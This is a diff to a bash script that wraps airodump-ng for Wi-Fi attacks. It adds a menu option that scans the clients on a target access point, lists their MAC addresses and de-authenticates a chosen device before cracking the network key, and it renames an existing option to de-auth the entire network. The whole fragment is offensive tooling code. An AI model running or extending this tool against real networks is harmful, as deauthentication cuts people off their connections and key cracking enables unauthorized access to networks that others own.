@@ -214,11 +214,12 @@ start () {
 		echo "$name [$security] ($ap) - channel: $channel"
 		echo ""
 		echo "-- SELECT OPERATION --"
-		echo "[1] See devices connected to network"
-		echo "[2] De-auth devices on network and crack Wi-Fi key"
-		echo "[3] Quit"
+		echo "[1] Monitor network"
+		echo "[2] De-auth entire network and crack Wi-Fi key"
+		echo "[3] De-auth one device on network and crack Wi-Fi key"
+		echo "[4] Quit to main menu"
 		echo ""
-		read -p "Select operation [1-3]: " choose
+		read -p "Select operation [1-4]: " choose
 		echo ""
 
 		if [ "$choose" == "1" ]; then
@@ -227,8 +228,47 @@ start () {
 			read -p "De-auth requests (default is 1): " number
 			echo ""
 			deAuth
+		elif [ "$choose" == "3" ]; then
+			read -p "Scan time in seconds (default is 10): " time
+			sudo rm clients-01.* --force > /dev/null
+			if [ "$time" != "" ]; then
+				scanTime="${time}s"
+			fi
+			echo ""
+			echo "Scanning clients on $name for $scanTime"
+			screen -d -m sudo airodump-ng -c $channel -d $ap -w clients --output-format csv $interfaceMon
+			sleep $scanTime
+			sudo killall screen
+			echo ""
+			echo "-- RESULT --"
+			i=0
+			while read line; do
+				if [ $i -gt 4 ]; then
+					length=${#line}
+					if [ $length -gt 1 ]; then
+						sel=$((i-4))
+						client=${line:0:17}
+						echo [$sel] $client
+					else
+						break
+					fi
+				fi
+				i=$((i+1))
+			done < clients-01.csv
+			echo ""
+			read -p "Select client to de-auth: " selClient
+			selClient=$((selClient+5))
+			res=$(sed -n $((selClient))p clients-01.csv)
+			client=${res:0:17}
+			echo ""
+			echo "$client on network $name"
+			echo ""
+			read -p "De-auth requests (default is 1): " number
+			echo ""
+			deAuth
 		else
-			exit
+			clear
+			start
 		fi
 	elif [ "$option2" == "2" ] # manual attack
 		then
